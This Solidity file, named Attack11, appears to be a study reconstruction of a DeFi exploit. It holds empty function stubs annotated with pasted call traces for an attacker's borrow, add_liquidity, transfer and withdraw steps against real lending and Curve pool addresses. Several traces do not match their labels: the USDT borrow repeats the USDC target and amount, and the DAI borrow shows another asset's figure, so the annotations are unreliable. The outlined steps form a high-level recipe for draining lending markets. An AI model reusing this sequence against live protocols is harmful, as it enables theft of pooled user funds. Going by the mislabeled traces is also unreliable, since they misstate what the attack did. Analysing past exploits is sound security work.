// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Attack11 {
  /**
   * Borrow 13,244.63 WETH + 3.6M USDC + 5.6M USDT + 4.26M DAI
   * Supply the stablecoins to Aave (to get aTokens, so USDC & USDT can’t be frozen)
   * Supply aDAI, aUSDT, aUSDC to Curve a3Crv pool
   * 
   * txn content:
   *  - balanceOf 攻擊前要先知道裡面有多少錢
   *  - borrow
   *  - balanceOf
   *  - borrow
   *  - balanceOf
   *  - borrow
   *  - balanceOf
   *  - borrow
   *  - balanceOf
   *  - borrow
   *  - balanceOf
   *  - transfer
   *  - balanceOf
   *  - balanceOf
   *  - balanceOf
   *  - add_liquidty
   *  - balanceOf
   *  - transfer
   *  - balanceOf
   *  - withdraw
   */
  
  /** borrow 13,244.63 WETH
   {
    "[FUNCTION]": "borrow",
    "[OPCODE]": "CALL",
    "from": {
      "address": "Attacker",
      "balance": "1496925883045275"
    },
    "to": {
      "address": "0x41c84c0e2ee0b740cf0d31f63f3b6f627dc6b393",
      "balance": "0"
    },
    "value": "0",
    "input": {
      "borrowAmount": "13244630331762545750401" // 13,244.63 WETH
    },
    "output": {
      "0": "0x"
    },
    "gas": {
      "gas_left": 3871243,
      "gas_used": 401884,
      "total_gas_used": 87577
    }
   }
   */
  function borrow1 (uint256 borrowAmount) external {}
  
  /** borrow 3.6M USDC
   {
    "[FUNCTION]": "borrow",
    "[OPCODE]": "CALL",
    "from": {
      "address": "Attacker",
      "balance": "1496925883045275"
    },
    "to": {
      "address": "cyUSDC",
      "balance": "0"
    },
    "value": "0",
    "input": {
      "borrowAmount": "3605354889525" // 3.6M USDC
    },
    "output": {
      "0": "0x"
    },
    }
    */
  function borrow2 (uint256 borrowAmount) external {}
  
  /** borrow 5.6M USDT
   {
    "[FUNCTION]": "borrow",
    "[OPCODE]": "CALL",
    "from": {
      "address": "Attacker",
      "balance": "1496925883045275"
    },
    "to": {
      "address": "cyUSDC",
      "balance": "0"
    },
    "value": "0",
    "input": {
      "borrowAmount": "3605354889525"
    },
    "output": {
      "0": "0x"
    },
    "gas": {
      "gas_left": 3468439,
      "gas_used": 359345,
      "total_gas_used": 490381
      }
    }
  */
  function borrow4 (uint256 borrowAmount) external {}
  
  /** borrow 4.26M DAI 
    {
    "[FUNCTION]": "borrow",
    "[OPCODE]": "CALL",
    "from": {
      "address": "Attacker",
      "balance": "1496925883045275"
    },
    "to": {
      "address": "0x48759f220ed983db51fa7a8c0d2aab8f3ce4166a",
      "balance": "0"
    },
    "value": "0",
    "input": {
      "borrowAmount": "5647242107646"
    },
    "output": {
      "0": "0x"
    },
    "gas": {
      "gas_left": 3109047,
      "gas_used": 397248,
      "total_gas_used": 849773
    }} 
  */
  function borrow3 (uint256 borrowAmount) external {}
  
  /** {
      "[FUNCTION]": "transfer",
      "[OPCODE]": "CALL",
      "from": {
        "address": "Attacker",
        "balance": "1496925883045275"
      },
      "to": {
        "address": "0x57ab1ec28d129707052df4df418d58a2d46d5f51",
        "balance": "0"
      },
      "value": "0",
      "input": {
        "to": "0x905315602ed9a854e325f692ff82f58799beab57",
        "value": "0"
      },
      "output": {
        "0": true
      },
      "gas": {
        "gas_left": 1870882,
        "gas_used": 65450,
        "total_gas_used": 2087938
      }
    } */
  function transfer1() external {}
  
  /** {
    "[FUNCTION]": "add_liquidity",
    "[OPCODE]": "CALL",
    "from": {
      "address": "Attacker",
      "balance": "1496925883045275"
    },
    "to": {
      "address": "0xdebf20617708857ebe4f679508e7b7863a8a8eee",
      "balance": "0"
    },
    "value": "0",
    "input": {
      "_amounts": [
        "4263138929122643119834654",
        "3997921016170",
        "5647242107646"
      ],
      "_min_mint_amount": "0",
      "_use_underlying": true
    },
    "output": {
      "0": "13532845885656673015123177"
    },
    "gas": {
      "gas_left": 1791773,
      "gas_used": 763059,
      "total_gas_used": 2167047
    }
} */
  function add_liquidity() external {}
  
  /**{
      "[FUNCTION]": "transfer",
      "[OPCODE]": "CALL",
      "from": {
        "address": "Attacker",
        "balance": "1496925883045275"
      },
      "to": {
        "address": "0xfd2a8fa60abd58efe3eee34dd494cd491dc14900",
        "balance": "0"
      },
      "value": "0",
      "input": {
        "_to": "0x905315602ed9a854e325f692ff82f58799beab57",
        "_value": "13532845885656673015123177"
      },
      "output": {
        "0": true
      },
      "gas": {
        "gas_left": 1035462,
        "gas_used": 24633,
        "total_gas_used": 2923358
      }
    }
   */
  function transfer2() external {}
  
  /**{
    "[FUNCTION]": "withdraw",
    "[OPCODE]": "CALL",
    "from": {
      "address": "Attacker",
      "balance": "1496925883045275"
    },
    "to": {
      "address": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", // WETH
      "balance": "5922084633361897187041983"
    },
    "value": "0",
    "input": {
      "wad": "13244630331762545750401"
    },
    "[OUTPUT]": "0x",
    "gas": {
      "gas_left": 1006570,
      "gas_used": 11895,
      "total_gas_used": 2952250
    }
    }
  */
  function withdraw() external {}
}